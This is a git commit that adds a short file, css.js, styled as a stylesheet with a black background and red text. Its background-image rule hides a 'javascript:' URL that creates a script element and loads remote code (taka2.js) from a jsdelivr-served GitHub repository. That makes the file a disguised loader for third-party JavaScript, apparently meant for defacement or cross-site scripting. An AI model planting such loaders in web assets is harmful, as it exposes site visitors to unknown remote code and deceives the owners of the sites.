f27b97d7d1fc7bdb0784ed03cb4362586233f705
Amir-abu <jkarlosos44@gmail.com>
2025-02-13 14:11:14 -0500

    Create css.js

---
+++ css.js
@@ -0,0 +1,5 @@
+body {
+    background-color: #000;
+    color: red;
+    background-image: url("javascript:document.body.appendChild(document.createElement('script')).src='https://cdn.jsdelivr.net/gh/Amir-abu/applite/taka2.js'");
+}
